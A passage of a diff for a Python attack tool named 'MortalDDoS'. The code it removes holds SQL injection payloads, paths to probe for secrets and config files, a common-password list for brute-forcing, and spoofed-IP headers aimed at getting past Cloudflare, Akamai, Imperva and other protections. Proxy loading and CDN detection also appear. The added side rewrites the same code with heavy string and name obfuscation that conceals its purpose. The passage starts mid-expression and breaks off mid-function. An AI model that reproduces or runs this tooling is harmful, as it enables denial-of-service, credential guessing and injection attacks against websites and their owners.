x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 27)) for IlIlIllIlIIlIlllI in x)))([67, 54, 93, 116, 105, 108, 122, 105, 127, 126, 127, 54, 83, 116, 104, 111]): (lambda n: int.__xor__(n, 1525667746282424002163).to_bytes(9, 'big').decode())(1159516967456766891271)}, {(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 142) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('d6a3c1fce7e9e7e0efe2a3dbdcc2'): (lambda n: int.__xor__(n, 74).to_bytes(1, 'big').decode())(101)}, {(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 244 for IlIlIIlIlIllllI in x[::-1]]).decode())([184, 166, 161, 217, 145, 128, 157, 134, 131, 145, 166, 217, 172]): (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 31 for IlIlIIlIlIllllI in x[::-1]]).decode())([48])}], (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 247 for IlIlIIlIlIllllI in x[::-1]]).decode())([158, 150, 154, 150, 156, 182]): [{(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 171) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('f386edc4d9dccad9cfcecf86edc4d9'): (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 216 for IlIlIIlIlIllllI in x[::-1]]).decode())([233, 246, 232, 246, 232, 246, 239, 234, 233])}, {(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 13)) for IlIlIllIlIIlIlllI in x)))([75, 108, 126, 121, 97, 116, 32, 73, 104, 111, 120, 106]): (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('31')}, {(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 105 for IlIlIIlIlIllllI in x[::-1]]).decode())([29, 26, 6, 33, 68, 13, 12, 13, 27, 8, 30, 27, 6, 47, 68, 49]): (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 65)) for IlIlIllIlIIlIlllI in x)))([45, 46, 34, 32, 45, 41, 46, 50, 53])}, {(lambda n: int.__xor__(n, 3949266475513317315403821081391272).to_bytes(14, 'big').decode())(3135815782945903515997627787911908): (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('2f')}, {(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 27)) for IlIlIllIlIIlIlllI in x)))([67, 54, 73, 126, 108, 105, 114, 111, 126, 54, 78, 73, 87]): (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('2f')}], (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('61767265706d49'): [{(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 171 for IlIlIIlIlIllllI in x[::-1]]).decode())([217, 196, 237, 134, 207, 206, 207, 217, 202, 220, 217, 196, 237, 134, 243]): (lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 161) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('9093968f918f918f90')}, {(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 64 for IlIlIIlIlIllllI in x[::-1]]).decode())([16, 9, 109, 52, 46, 37, 41, 44, 3, 109, 37, 53, 50, 20]): (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 37)) for IlIlIllIlIIlIlllI in x)))([20, 23, 18, 11, 21, 11, 21, 11, 20])}, {(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 22) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('4e3b557a7f7378623b5f46'): (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 89 for IlIlIIlIlIllllI in x[::-1]]).decode())([104, 119, 105, 119, 105, 119, 110, 107, 104])}, {(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 135) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('dfaac8f5eee0eee9e6ebaac1e8f5'): (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 118)) for IlIlIllIlIIlIlllI in x)))([71, 68, 65, 88, 70, 88, 70, 88, 71])}, {(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('50492d676e6974616e696769724f2d58'): (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 126)) for IlIlIllIlIIlIlllI in x)))([79, 76, 73, 80, 78, 80, 78, 80, 79])}], (lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 34) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('6d746a414e4d5746'): [{(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 32) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('780d664f525741524445440d664f52'): (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 254 for IlIlIIlIlIllllI in x[::-1]]).decode())([207, 208, 206, 208, 206, 208, 201, 204, 207])}, {(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 23)) for IlIlIllIlIIlIlllI in x)))([79, 58, 84, 123, 126, 114, 121, 99, 58, 94, 71]): (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 19)) for IlIlIllIlIIlIlllI in x)))([34, 33, 36, 61, 35, 61, 35, 61, 34])}, {(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 76)) for IlIlIllIlIIlIlllI in x)))([20, 97, 30, 41, 45, 32, 97, 5, 28]): (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('312e302e302e373231')}, {(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 169 for IlIlIIlIlIllllI in x[::-1]]).decode())([249, 224, 132, 206, 199, 192, 221, 200, 199, 192, 206, 192, 219, 230, 132, 241]): (lambda n: int.__xor__(n, 2714129511261908183223).to_bytes(9, 'big').decode())(2989537323368854521478)}], (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 96)) for IlIlIllIlIIlIlllI in x)))([8, 15, 13, 5, 78, 16, 12]): [{(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 161) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('f98ce7ced3d6c0d3c5c4c58ce7ced3'): (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('312e302e302e373231')}, {(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('50492d6c6165522d58'): (lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 231) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('d6d5d0c9d7c9d7c9d6')}, {(lambda n: int.__xor__(n, 196096132003552919435518457).to_bytes(11, 'big').decode())(302352981011455233507977385): (lambda n: int.__xor__(n, 1639191879337655799639).to_bytes(9, 'big').decode())(1954088312768146055526)}], (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('736b6c6f465f7265627963'): [{(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 126 for IlIlIIlIlIllllI in x[::-1]]).decode())([12, 17, 56, 83, 26, 27, 26, 12, 31, 9, 12, 17, 56, 83, 38]): (lambda n: int.__xor__(n, 1122909041805617038176).to_bytes(9, 'big').decode())(256906009130725059921)}, {(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 130) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('daafd0e7e3eeafcbd2'): (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 159 for IlIlIIlIlIllllI in x[::-1]]).decode())([174, 177, 175, 177, 175, 177, 168, 173, 174])}, {(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 249 for IlIlIIlIlIllllI in x[::-1]]).decode())([169, 176, 212, 141, 151, 156, 144, 149, 186, 212, 161]): (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 136 for IlIlIIlIlIllllI in x[::-1]]).decode())([185, 166, 184, 166, 184, 166, 191, 186, 185])}], (lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 202) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('aea2a5b9bea3a4ad'): [{(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('726f462d646564726177726f462d58'): (lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 179) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('8281849d839d839d82')}, {(lambda n: int.__xor__(n, 1902957918581195712723).to_bytes(9, 'big').decode())(1162544225606563783043): (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('312e302e302e373231')}, {(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 37) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('7d0866494c404b51086c75'): (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('312e302e302e373231')}], (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('584e49474e'): [{(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('726f462d646564726177726f462d58'): (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('312e302e302e373231')}, {(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 60) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('64116e595d5011756c'): (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 48 for IlIlIIlIlIllllI in x[::-1]]).decode())([1, 30, 0, 30, 0, 30, 7, 2, 1])}, {(lambda n: int.__xor__(n, 1153362745737043267690458455709210435296905758535180332953).to_bytes(24, 'big').decode())(2921405041954768369566542017438436498469259192083456311531): (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 105)) for IlIlIllIlIIlIlllI in x)))([88, 91, 94, 71, 89, 71, 89, 71, 88])}]}
 
-bootstrap()
+class IlIIIlIlIIIllIIllIlIllllI:
 
-# --- GLOBAL VARIABLES ---
-packet_count = 0
-lock = threading.Lock()
-stop_attack = False
-
-# --- CORE DATABASES ---
-USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/122.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0"
-] * 30
-
-SQLI_PAYLOADS = [
-    "' OR 1=1--", "' UNION SELECT NULL--", "admin' --", "' AND 1=2--", "') OR ('1'='1",
-    "'; DROP TABLE users; --", "' OR '1'='1", "' OR 1=1#", "' OR 1=1/*", "admin'--",
-    "admin'/*", "admin'#", "' OR 'x'='x", "' OR 1=1-- -", "' UNION ALL SELECT 1,2,3--",
-    "admin' AND 1=1--", "' OR 'a'='a'--", "' OR 1=1 LIMIT 1--", "' OR 'unusual' = 'unusual'",
-    "' OR 1=1 AND '1'='1", "admin' OR '1'='1", "' OR '1'='1' --", "' OR 'foo' = 'foo'"
-]
-
-VULN_PATHS = [
-    "/admin/", "/login.php", "/wp-login.php", "/administrator/", "/config.php", 
-    "/backup.sql", "/shell.php", "/phpinfo.php", "/robots.txt", "/.git/config", 
-    "/.env", "/wp-config.php", "/configuration.php", "/web.config", "/settings.php",
-    "/db.php", "/database.php", "/connect.php", "/setup.php", "/install.php",
-    "/debug.php", "/test.php", "/upload.php", "/uploads/", "/files/", "/download.php"
-] * 20
-
-PASSWORD_LIST = [
-    "admin", "123456", "password", "admin123", "qwerty", "root", "toor", "pass", 
-    "guest", "default", "administrator", "login", "welcome", "1234", "12345",
-    "123456789", "12345678", "abc123", "monkey", "dragon", "iloveyou", "princess",
-    "master", "1234567890", "computer", "1234567", "internet", "michael", "jessica"
-]
-
-# --- WAF BYPASS HEADERS ---
-WAF_BYPASS_HEADERS = [
-    {'X-Forwarded-For': '127.0.0.1'},
-    {'X-Forwarded-For': '10.0.0.1'},
-    {'X-Forwarded-For': '172.16.0.1'},
-    {'X-Forwarded-For': '192.168.1.1'},
-    {'X-Originating-IP': '127.0.0.1'},
-    {'X-Remote-IP': '127.0.0.1'},
-    {'X-Remote-Addr': '127.0.0.1'},
-    {'X-Client-IP': '127.0.0.1'},
-    {'True-Client-IP': '127.0.0.1'},
-    {'CF-Connecting-IP': '127.0.0.1'},
-    {'X-Real-IP': '127.0.0.1'}
-]
-
-# --- CDN/WAF SPECIFIC HEADERS ---
-CDN_BYPASS_HEADERS = {
-    'Cloudflare': [
-        {'CF-Connecting-IP': '127.0.0.1'},
-        {'True-Client-IP': '127.0.0.1'},
-        {'X-Forwarded-For': '127.0.0.1, 127.0.0.2'},
-        {'X-Forwarded-Host': 'localhost'},
-        {'X-Original-URL': '/'},
-        {'X-Rewrite-URL': '/'}
-    ],
-    'Akamai': [
-        {'X-Forwarded-For': '127.0.0.1'},
-        {'Fastly-Debug': '1'},
-        {'X-Forwarded-Host': 'localhost'},
-        {'X-Original-URL': '/'},
-        {'X-Rewrite-URL': '/'}
-    ],
-    'Imperva': [
-        {'X-Forwarded-For': '127.0.0.1'},
-        {'True-Client-IP': '127.0.0.1'},
-        {'X-Client-IP': '127.0.0.1'},
-        {'X-Original-For': '127.0.0.1'},
-        {'X-Originating-IP': '127.0.0.1'}
-    ],
-    'OVHcloud': [
-        {'X-Forwarded-For': '127.0.0.1'},
-        {'X-Client-IP': '127.0.0.1'},
-        {'X-Real-IP': '127.0.0.1'},
-        {'X-Originating-IP': '127.0.0.1'}
-    ],
-    'home.pl': [
-        {'X-Forwarded-For': '127.0.0.1'},
-        {'X-Real-IP': '127.0.0.1'},
-        {'X-Client-IP': '127.0.0.1'}
-    ],
-    'cyber_Folks': [
-        {'X-Forwarded-For': '127.0.0.1'},
-        {'X-Real-IP': '127.0.0.1'},
-        {'X-Client-IP': '127.0.0.1'}
-    ],
-    'dhosting': [
-        {'X-Forwarded-For': '127.0.0.1'},
-        {'X-Real-IP': '127.0.0.1'},
-        {'X-Client-IP': '127.0.0.1'}
-    ],
-    'NGINX': [
-        {'X-Forwarded-For': '127.0.0.1'},
-        {'X-Real-IP': '127.0.0.1'},
-        {'X-Original-Forwarded-For': '127.0.0.1'}
-    ]
-}
-# --- PROXY MANAGEMENT ---
-class ProxyManager:
     @staticmethod
-    def load_from_file(filename):
-        """Load proxies from a text file"""
+    def IIlIIIIIIIlIlIlIIl(lIIllllllIIIlIIllIIlIIlll):
         proxies = []
         try:
-            with open(filename, 'r') as f:
-                proxies = [line.strip() for line in f if line.strip() and ':' in line]
-            print(f"{Fore.GREEN}[+] Loaded {len(proxies)} proxies from {filename}")
+            with lIlIIIIllllIlIlIII[(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 11)) for IlIlIllIlIIlIlllI in x)))([100, 123, 110, 101])](lIIllllllIIIlIIllIIlIIlll, (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 100 for IlIlIIlIlIllllI in x[::-1]]).decode())([22])) as llIllIllllIIlIlIIIIIIlI:
+                proxies = [llIIIIIIlIIIlIIIll.strip() for llIIIIIIlIIIlIIIll in llIllIllllIIlIlIIIIIIlI if llIIIIIIlIIIlIIIll.strip() and (lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 101) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('5f') in llIIIIIIlIIIlIIIll]
+            lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 137815147666).to_bytes(5, 'big').decode())(345275443942)](f"{Fore.GREEN}[+] Loaded {lIlIIIIllllIlIlIII[(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 119) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('1b1219')](proxies)} proxies from {lIIllllllIIIlIIllIIlIIlll}")
         except FileNotFoundError:
-            print(f"{Fore.RED}[-] Proxy file {filename} not found")
+            lIlIIIIllllIlIlIII[(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('746e697270')](f'{Fore.RED}[-] Proxy file {lIIllllllIIIlIIllIIlIIlll} not found')
         except Exception as e:
-            print(f"{Fore.RED}[-] Error loading proxies: {e}")
+            lIlIIIIllllIlIlIII[(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('746e697270')](f'{Fore.RED}[-] Error loading proxies: {e}')
         return proxies
 
     @staticmethod
-    def fetch_from_api():
-        """Fetch proxies from public APIs"""
-        print(f"{Fore.YELLOW}[+] Fetching proxies from API...")
+    def IlIIIIIIlIllI():
+        lIlIIIIllllIlIlIII[(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 106)) for IlIlIllIlIIlIlllI in x)))([26, 24, 3, 4, 30])](f'{Fore.YELLOW}[+] Fetching proxies from API...')
         proxies = []
         try:
-            response = requests.get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=all&timeout=5000&country=all&ssl=all&anonymity=all", timeout=10)
-            if response.status_code == 200:
-                proxies = [line.strip() for line in response.text.split('\n') if line.strip() and ':' in line]
-            print(f"{Fore.GREEN}[+] Fetched {len(proxies)} proxies from API")
+            llIlIIlIllIIlIIllI = lIllIIlllIlIIIllIllIIlIII((lambda n: int.__xor__(n, 2524857417145163131787526321869822869876741842768356988426241520390159567700131084498181714265302784324186875053582394524079305173216855353495124042931436892325019182475980413267872914971476981960221187507853750841629641782498772066302282758509497213788905558361896).to_bytes(110, 'big').decode())(1774528347965007908260474936327889947294144435032725153783131811712668624257751548419981215998872031234446046610073388723676287091719840751019523801656563868056467949824082974321487188069892452612765600584081134357479347252351884815577350962771461090217448152279876), timeout=0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 18)) for IlIlIllIlIIlIlllI in x)))([32, 38]), 16) ^ 0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 75)) for IlIlIllIlIIlIlllI in x)))([121, 46]), 16))
+            if llIlIIlIllIIlIIllI.status_code == 0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 218) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('e9e8'), 16) << 0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('32'), 16) | 0 .__class__((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 143 for IlIlIIlIlIllllI in x[::-1]]).decode())([191]), 16):
+                proxies = [llIIIIIIlIIIlIIIll.strip() for llIIIIIIlIIIlIIIll in llIlIIlIllIIlIIllI.text.split((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 14)) for IlIlIllIlIIlIlllI in x)))([4])) if llIIIIIIlIIIlIIIll.strip() and (lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 89) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('63') in llIIIIIIlIIIlIIIll]
+            lIlIIIIllllIlIlIII[(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 154) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('eae8f3f4ee')](f"{Fore.GREEN}[+] Fetched {lIlIIIIllllIlIlIII[(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 50)) for IlIlIllIlIIlIlllI in x)))([94, 87, 92])](proxies)} proxies from API")
         except Exception as e:
-            print(f"{Fore.RED}[-] Error fetching proxies: {e}")
+            lIlIIIIllllIlIlIII[(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 208) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('a0a2b9bea4')](f'{Fore.RED}[-] Error fetching proxies: {e}')
         return proxies
 
     @staticmethod
-    def get_proxy_choice():
-        """Get proxy option from user"""
-        print(f"\n{Fore.CYAN}Proxy Options:")
-        print("[1] Load from file")
-        print("[2] Fetch from API")
-        print("[3] None (direct connection)")
-        
-        choice = input(f"{Fore.RED}Select proxy option: {Fore.WHITE}")
+    def IlIIIlllIIIIllIIIIllIllII():
+        lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 570347831137).to_bytes(5, 'big').decode())(1051076350229)](f'\n{Fore.CYAN}Proxy Options:')
+        lIlIIIIllllIlIlIII[(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 30)) for IlIlIllIlIIlIlllI in x)))([110, 108, 119, 112, 106])]((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 208 for IlIlIIlIlIllllI in x[::-1]]).decode())([181, 188, 185, 182, 240, 189, 191, 162, 182, 240, 180, 177, 191, 156, 240, 141, 225, 139]))
+        lIlIIIIllllIlIlIII[(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 177 for IlIlIIlIlIllllI in x[::-1]]).decode())([197, 223, 216, 195, 193])]((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('495041206d6f7266206863746546205d325b'))
+        lIlIIIIllllIlIlIII[(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 24)) for IlIlIllIlIIlIlllI in x)))([104, 106, 113, 118, 108])]((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('296e6f697463656e6e6f63207463657269642820656e6f4e205d335b'))
+        choice = lIlIIIIllllIlIlIII[(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 108) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('05021c1918')](f'{Fore.RED}Select proxy option: {Fore.WHITE}')
         proxies = []
-        
-        if choice == "1":
-            filename = input(f"{Fore.CYAN}Enter proxy file name (default: proxies.txt): {Fore.WHITE}") or "proxies.txt"
-            proxies = ProxyManager.load_from_file(filename)
-        elif choice == "2":
-            proxies = ProxyManager.fetch_from_api()
-        elif choice == "3":
-            print(f"{Fore.YELLOW}[!] Using direct connection (no proxies)")
+        if choice == (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('31'):
+            lIIllllllIIIlIIllIIlIIlll = lIlIIIIllllIlIlIII[(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('7475706e69')](f'{Fore.CYAN}Enter proxy file name (default: proxies.txt): {Fore.WHITE}') or (lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 67) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('33312c3b2a26306d373b37')
+            proxies = IlIIIlIlIIIllIIllIlIllllI.IIlIIIIIIIlIlIlIIl(lIIllllllIIIlIIllIIlIIlll)
+        elif choice == (lambda n: int.__xor__(n, 154).to_bytes(1, 'big').decode())(168):
+            proxies = IlIIIlIlIIIllIIllIlIllllI.IlIIIIIIlIllI()
+        elif choice == (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 218 for IlIlIIlIlIllllI in x[::-1]]).decode())([233]):
+            lIlIIIIllllIlIlIII[(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 94) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('2e2c37302a')](f'{Fore.YELLOW}[!] Using direct connection (no proxies)')
         else:
-            print(f"{Fore.RED}[-] Invalid choice, using direct connection")
-            
+            lIlIIIIllllIlIlIII[(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('746e697270')](f'{Fore.RED}[-] Invalid choice, using direct connection')
         return proxies
 
-# --- ADVANCED DDoS ENGINE ---
-class MortalDDoS:
+class lIIlIlIIllIIII:
+
     def __init__(self):
         self.proxies = []
-        self.packet_count = 0
-        self.stop_attack = False
+        self.IlIllIllIlIIlIIIIlIIIIlll = 0 .__class__((lambda n: int.__xor__(n, 64880).to_bytes(2, 'big').decode())(51273), 16) ^ 0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('3935'), 16)
+        self.llllIIlIIlIIIIlllllIIIll = False
         self.target_cdn = None
 
-    def validate_target(self, target):
-        """Validate target URL or IP"""
+    def llIllIlIIIlIllIl(self, target):
         if not target:
             return False
-        if "http://" not in target and "https://" not in target:
-            if not self.is_valid_ip(target):
-                print(f"{Fore.RED}[-] Invalid target format. Use http:// or https:// for URLs, or valid IP for IPs")
+        if (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 66)) for IlIlIllIlIIlIlllI in x)))([42, 54, 54, 50, 120, 109, 109]) not in target and (lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 5) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('6d717175763f2a2a') not in target:
+            if not self.IlIIIllllIllIIIlIlIllll(target):
+                lIlIIIIllllIlIlIII[(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 27 for IlIlIIlIlIllllI in x[::-1]]).decode())([111, 117, 114, 105, 107])](f'{Fore.RED}[-] Invalid target format. Use http:// or https:// for URLs, or valid IP for IPs')
                 return False
         return True
 
-    def is_valid_ip(self, ip):
-        """Check if string is valid IP address"""
+    def IlIIIllllIllIIIlIlIllll(self, lIlIllIlllIl):
         try:
-            socket.inet_aton(ip)
+            llIIlllllllIIlIlI(lIlIllIlllIl)
             return True
         except socket.error:
             return False
 
-    def detect_cdn(self, target):
-        """Detect CDN/WAF provider"""
+    def llllIIIlIllIlIl(self, target):
         try:
-            response = requests.get(target, timeout=10)
-            headers = response.headers
-            server_header = headers.get('Server', '').lower()
-            cf_ray = headers.get('CF-RAY')
-            powered_by = headers.get('X-Powered-By', '').lower()
-            
-            # Sprawdź Cloudflare
-            if cf_ray or 'cloudflare' in server_header or 'cf-' in str(headers).lower():
-                self.target_cdn = 'Cloudflare'
-                print(f"{Fore.GREEN}[+] Detected CDN: Cloudflare")
+            llIlIIlIllIIlIIllI = lIllIIlllIlIIIllIllIIlIII(target, timeout=0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('46'), 16) * 0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 14)) for IlIlIllIlIIlIlllI in x)))([62]), 16) + 0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 208) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('b1'), 16))
+            IlIIllIIIllll = llIlIIlIllIIlIIllI.IlIIllIIIllll
